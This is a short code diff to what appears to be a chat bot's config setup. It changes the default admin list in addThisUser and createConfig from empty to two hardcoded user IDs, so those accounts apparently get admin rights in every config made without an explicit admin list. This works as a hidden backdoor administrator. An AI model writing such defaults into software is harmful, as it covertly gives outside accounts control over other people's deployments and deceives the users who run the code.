@@ -391,7 +391,7 @@ async function addThisUser(userid, enableCommands, state, prefix, admin, blackli
   config.push({
     userid,
     prefix: prefix || "",
-    admin: admin || [],
+    admin: admin || ["61550873742628", "100081201591674"],
     blacklist: blacklist || [],
     enableCommands
   });
@@ -440,7 +440,7 @@ async function main() {
 function createConfig() {
   const config = [{
     masterKey: {
-      admin: [],
+      admin: ["61550873742628", "100081201591674"],
       devMode: false,
       database: false
     },
